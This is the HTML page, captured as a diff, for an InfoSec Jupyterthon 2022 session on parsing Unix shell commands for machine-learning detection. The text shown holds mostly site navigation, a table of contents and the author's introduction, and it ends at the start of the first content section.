@@ -1,0 +1,2159 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Shell Language Processing</title>
+    
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+<link href="../../_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
+    <link rel="stylesheet" href="../../_static/styles/sphinx-book-theme.css?digest=62ba249389abaaa9ffc34bf36a076bdc1d65ee18" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/tabs.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/design-style.b7bb847fb20b106c3d81b95245e65545.min.css" />
+    
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">
+
+    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/scripts/sphinx-book-theme.js?digest=f31d14ad54b65d19161ba51d4ffff3a77ae00456"></script>
+    <script src="../../_static/tabs.js"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../_static/design-tabs.js"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
+const thebe_selector = ".thebe,.cell"
+const thebe_selector_input = "pre"
+const thebe_selector_output = ".output, .cell_output"
+</script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <script>window.MathJax = {"options": {"processHtmlClass": "tex2jax_process|mathjax_process|math|output_area"}}</script>
+    <script defer="defer" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <link rel="canonical" href="https://infosecjupyterthon.com/2022/sessions/day2-08-Shell-Language-Processing.html" />
+    <link rel="shortcut icon" href="../../_static/favicon.jpg"/>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Day 1" href="../../workshops/day1/intro.html" />
+    <link rel="prev" title="Extending MSTICPy with Pivot functions" href="day1-11-Extending_MSTICPy.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
+<!-- Checkboxes to toggle the left sidebar -->
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
+<label class="overlay overlay-navbar" for="__navigation">
+    <div class="visually-hidden">Toggle navigation sidebar</div>
+</label>
+<!-- Checkboxes to toggle the in-page toc -->
+<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
+<label class="overlay overlay-pagetoc" for="__page-toc">
+    <div class="visually-hidden">Toggle in-page Table of Contents</div>
+</label>
+<!-- Headers at the top -->
+<div class="announcement header-item noprint">💖 The InfoSec Jupyterthon is back! December 2nd and 3rd, 2022 🚀</div>
+<div class="header header-item noprint"></div>
+
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<!-- Sidebar -->
+<div class="bd-sidebar noprint" id="site-navigation">
+    <div class="bd-sidebar__content">
+        <div class="bd-sidebar__top"><div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="../../_static/logo.png" class="logo" alt="logo">
+      
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Getting Started
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../conduct.html">
+   Code of Conduct
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../collaborators/intro.html">
+   Collaborators
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Roberto-Rodriguez.html">
+     Roberto Rodriguez
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Chi-Nguyen.html">
+     Chi Nguyen
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Ian-Hellen.html">
+     Ian Hellen
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Joyce-Bacic.html">
+     Joyce Bacic
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Ashwin-Patil.html">
+     Ashwin Patil
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Thomas-Roccia.html">
+     Thomas Roccia
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Pete-Bryan.html">
+     Pete Bryan
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../collaborators/Jose-Rodriguez.html">
+     Jose Rodriguez
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  2022 Edition
+ </span>
+</p>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../agenda.html">
+   Agenda
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../speakers/intro.html">
+   Speakers
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/roberto_rodriguez.html">
+     Roberto Rodriguez
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/ian_hellen.html">
+     Ian Hellen
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/leo_meyerovich.html">
+     Leo Meyerovich
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/chi_nguyen.html">
+     Chi Nguyen
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/amritpal_singh.html">
+     Amritpal Singh
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/vijay_punja.html">
+     Vijay Punja
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/james_duncan.html">
+     James Duncan
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/ryan_marcotte_cobb.html">
+     Ryan Marcotte Cobb
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/saksham_tushar.html">
+     Saksham Tushar
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/christian_camilo_urcuqui_lopez.html">
+     Christian Camilo Urcuqui Lopez
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/pete_bryan.html">
+     Pete Bryan
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/ashwin_patil.html">
+     Ashwin Patil
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/thomas_roccia.html">
+     Thomas Roccia
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/jose_rodriguez.html">
+     Jose Rodriguez
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/alex_morrise.html">
+     Alex Morrise
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/dmitrijs_trizna.html">
+     Dmitrijs Trizna
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/mehmet_ergene.html">
+     Mehmet Ergene
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/jerry_gamblin.html">
+     Jerry Gamblin
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/balaji_sampath.html">
+     Balaji Sampath
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/janantha_marasinghe.html">
+     Janantha Marasinghe
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/paul_coccoli.html">
+     Paul Coccoli
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/brayan_mena.html">
+     Brayan Mena
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../speakers/john_mac.html">
+     John Mac
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 current active has-children">
+  <a class="reference internal" href="intro.html">
+   Sessions
+  </a>
+  <input checked="" class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="day1-01-Opening_Remarks.html">
+     Opening Remarks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="day1-05-Exploratory_Data_I_mean_Threat_Analytics_using_Jupyter_Notebooks.html">
+     Exploratory Threat Analytics using Jupyter Notebooks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="day1-11-Extending_MSTICPy.html">
+     Extending MSTICPy with Pivot functions
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     Shell Language Processing
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Workshops
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../workshops/day1/intro.html">
+   Day 1
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+  <label for="toctree-checkbox-4">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day1/day1-1-Jupyter-Introduction.html">
+     Workshop 1.1:
+     <font color="peru">
+      Jupyter Notebooks Introduction
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day1/day1-2-Acquiring-data.html">
+     Workshop 1.2:
+     <font color="peru">
+      Acquiring Data
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day1/day1-3-Data-Analysis-with-Pandas%20Intro.html">
+     Workshop 1.3:
+     <font color="peru">
+      Basics of Data Analysis with Pandas
+     </font>
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../workshops/day2/intro.html">
+   Day 2
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+  <label for="toctree-checkbox-5">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day2/day2-1-Jupyter-advanced-topics.html">
+     Workshop 2.1:
+     <font color="peru">
+      Jupyter Notebooks Advanced
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day2/day2-1-R-demo-notebook.html">
+     Workshop 2.1:
+     <font color="peru">
+      R Demo Notebook
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day2/day2-2-Visualization.html">
+     Workshop 2.2:
+     <font color="peru">
+      Visualization in Jupyter Notebooks
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day2/day2-3-Advanced-pandas.html">
+     Workshop 2.3:
+     <font color="peru">
+      Advanced Pandas
+     </font>
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../workshops/day2/day2-4-MSTICPy.html">
+     Workshop 2.4:
+     <font color="peru">
+      MSTICPy
+     </font>
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+
+    </div>
+</nav></div>
+        <div class="bd-sidebar__bottom">
+             <!-- To handle the deprecated key -->
+            
+            <div class="navbar_extra_footer">
+            Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+            </div>
+            
+        </div>
+    </div>
+    <div id="rtd-footer-container"></div>
+</div>
+
+
+          
+
+
+          
+<!-- A tiny helper pixel to detect if we've scrolled -->
+<div class="sbt-scroll-pixel-helper"></div>
+<!-- Main content -->
+<div class="col py-0 content-container">
+    
+    <div class="header-article row sticky-top noprint">
+        
+
+
+
+<div class="col py-1 d-flex header-article-main">
+    <div class="header-article__left">
+        
+        <label for="__navigation"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="right"
+title="Toggle navigation"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-bars"></i>
+  </span>
+
+</label>
+
+        
+    </div>
+    <div class="header-article__right">
+<div class="menu-dropdown menu-dropdown-launch-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Launch interactive content">
+      <i class="fas fa-rocket"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://mybinder.org/v2/gh/OTRF/infosec-jupyterthon/master?urlpath=lab/tree/docs/2022/sessions/day2-08-Shell-Language-Processing.ipynb"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Launch on Binder"
+>
+  
+
+<span class="headerbtn__icon-container">
+  
+    <img src="../../_static/images/logo_binder.svg">
+  </span>
+<span class="headerbtn__text-container">Binder</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<button onclick="toggleFullScreen()"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="bottom"
+title="Fullscreen mode"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+<div class="menu-dropdown menu-dropdown-repository-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Source repositories">
+      <i class="fab fa-github"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://github.com/OTRF/infosec-jupyterthon"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Source repository"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+<span class="headerbtn__text-container">repository</span>
+</a>
+
+      </li>
+      
+      <li>
+        <a href="https://github.com/OTRF/infosec-jupyterthon/issues/new?title=Issue%20on%20page%20%2F2022/sessions/day2-08-Shell-Language-Processing.html&body=Your%20issue%20content%20here."
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Open an issue"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-lightbulb"></i>
+  </span>
+<span class="headerbtn__text-container">open issue</span>
+</a>
+
+      </li>
+      
+      <li>
+        <a href="https://github.com/OTRF/infosec-jupyterthon/edit/master/docs/2022/sessions/day2-08-Shell-Language-Processing.ipynb"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Edit this page"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-pencil-alt"></i>
+  </span>
+<span class="headerbtn__text-container">suggest edit</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<div class="menu-dropdown menu-dropdown-download-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Download this page">
+      <i class="fas fa-download"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="../../_sources/2022/sessions/day2-08-Shell-Language-Processing.ipynb"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Download source file"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="headerbtn__text-container">.ipynb</span>
+</a>
+
+      </li>
+      
+      <li>
+        
+<button onclick="printPdf(this)"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="left"
+title="Print to PDF"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="headerbtn__text-container">.pdf</span>
+</button>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+<label for="__page-toc"
+  class="headerbtn headerbtn-page-toc"
+  
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-list"></i>
+  </span>
+
+</label>
+
+    </div>
+</div>
+
+<!-- Table of contents -->
+<div class="col-md-3 bd-toc show noprint">
+    <div class="tocsection onthispage pt-5 pb-3">
+        <i class="fas fa-list"></i> Contents
+    </div>
+    <nav id="bd-toc-nav" aria-label="Page">
+        <ul class="visible nav section-nav flex-column">
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#">
+   Shell Language Processing
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#parsing-unix-commands-for-machine-learning">
+     Parsing Unix Commands For Machine Learning
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#unreleased-data-potential">
+   Unreleased data potential
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#loading-data">
+   Loading data
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#data-preprocessing-for-machine-learning-ml-model">
+   Data preprocessing for Machine Learning (ML) model
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#tokenization">
+     Tokenization
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#utilization-of-argc-and-ax-values-in-auditd-logging">
+       1. Utilization of
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         argc
+        </span>
+       </code>
+       and
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         aX
+        </span>
+       </code>
+       values in
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         auditd
+        </span>
+       </code>
+       logging
+      </a>
+     </li>
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dedicated-tokenizer-for-commands">
+       2. Dedicated Tokenizer for commands
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#encoding">
+     Encoding
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#sklearn-library-with-custom-tokenizer">
+       <strong>
+        sklearn
+       </strong>
+       library with custom tokenizer:
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#supervised-learning-example-classification-with-cross-validation">
+   Supervised learning example: classification with cross-validation
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#cross-validation">
+     Cross-Validation
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#more-on-evaluation-of-ml-models-in-infosec-roc-and-detection-rate-at-fixed-false-positive-threshold">
+       More on evaluation of ML models in infosec - ROC and detection rate at fixed False Positive threshold
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#heavy-imbalance-representative-situation-for-security-problems">
+   Heavy Imbalance: representative situation for security problems
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#supervised-learning-recap">
+     Supervised learning - recap:
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#unsupervised-learning-anomaly-detection">
+   Unsupervised learning: Anomaly Detection
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#dimensionality-reduction">
+     Dimensionality reduction
+    </a>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#bad-questions-for-unsupervised-machine-learning">
+     <strong>
+      Bad
+     </strong>
+     questions for unsupervised machine learning:
+    </a>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#good-questions-for-unsupervised-machine-learning-focus-on-specific-ttps">
+     <strong>
+      Good
+     </strong>
+     questions for unsupervised machine learning focus on specific TTPs:
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#adversarial-input-evasion-of-ml-heuristics">
+   Adversarial Input - evasion of ML heuristics
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#summary-and-final-thoughts">
+   Summary and final thoughts
+  </a>
+ </li>
+</ul>
+
+    </nav>
+</div>
+    </div>
+    <div class="article row">
+        <div class="col pl-md-3 pl-lg-5 content-container">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Shell Language Processing</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#">
+   Shell Language Processing
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#parsing-unix-commands-for-machine-learning">
+     Parsing Unix Commands For Machine Learning
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#unreleased-data-potential">
+   Unreleased data potential
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#loading-data">
+   Loading data
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#data-preprocessing-for-machine-learning-ml-model">
+   Data preprocessing for Machine Learning (ML) model
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#tokenization">
+     Tokenization
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#utilization-of-argc-and-ax-values-in-auditd-logging">
+       1. Utilization of
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         argc
+        </span>
+       </code>
+       and
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         aX
+        </span>
+       </code>
+       values in
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         auditd
+        </span>
+       </code>
+       logging
+      </a>
+     </li>
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dedicated-tokenizer-for-commands">
+       2. Dedicated Tokenizer for commands
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#encoding">
+     Encoding
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#sklearn-library-with-custom-tokenizer">
+       <strong>
+        sklearn
+       </strong>
+       library with custom tokenizer:
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#supervised-learning-example-classification-with-cross-validation">
+   Supervised learning example: classification with cross-validation
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#cross-validation">
+     Cross-Validation
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h3 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#more-on-evaluation-of-ml-models-in-infosec-roc-and-detection-rate-at-fixed-false-positive-threshold">
+       More on evaluation of ML models in infosec - ROC and detection rate at fixed False Positive threshold
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#heavy-imbalance-representative-situation-for-security-problems">
+   Heavy Imbalance: representative situation for security problems
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#supervised-learning-recap">
+     Supervised learning - recap:
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#unsupervised-learning-anomaly-detection">
+   Unsupervised learning: Anomaly Detection
+  </a>
+  <ul class="visible nav section-nav flex-column">
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#dimensionality-reduction">
+     Dimensionality reduction
+    </a>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#bad-questions-for-unsupervised-machine-learning">
+     <strong>
+      Bad
+     </strong>
+     questions for unsupervised machine learning:
+    </a>
+   </li>
+   <li class="toc-h2 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#good-questions-for-unsupervised-machine-learning-focus-on-specific-ttps">
+     <strong>
+      Good
+     </strong>
+     questions for unsupervised machine learning focus on specific TTPs:
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#adversarial-input-evasion-of-ml-heuristics">
+   Adversarial Input - evasion of ML heuristics
+  </a>
+ </li>
+ <li class="toc-h1 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#summary-and-final-thoughts">
+   Summary and final thoughts
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <main id="main-content" role="main">
+                
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="shell-language-processing">
+<h1>Shell Language Processing<a class="headerlink" href="#shell-language-processing" title="Permalink to this headline">#</a></h1>
+<div class="section" id="parsing-unix-commands-for-machine-learning">
+<h2>Parsing Unix Commands For Machine Learning<a class="headerlink" href="#parsing-unix-commands-for-machine-learning" title="Permalink to this headline">#</a></h2>
+<p>Author:</p>
+<p><strong>Dmitrijs Trizna</strong><br />
+Sr. Software Engineer &#64; Microsoft<br />
+MSc. Data Science, MSc. Network Security<br />
+Certified: OSCP, SANS, Stanford Online, etc.<br />
+Blog: <a class="reference external" href="https://ditrizna.medium.com">https://ditrizna.medium.com</a></p>
+<center><img src="../img/Tux_wordcloud.png" width=350></center>
+<p>Disclaimer:</p>
+<p>Artificial Intelligence (AI) is <strong>not</strong> a silver bullet - it is a powerful <strong>tool</strong> that needs a human supervision, and those who master this tool will have an advantage.</p>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="unreleased-data-potential">
+<h1>Unreleased data potential<a class="headerlink" href="#unreleased-data-potential" title="Permalink to this headline">#</a></h1>
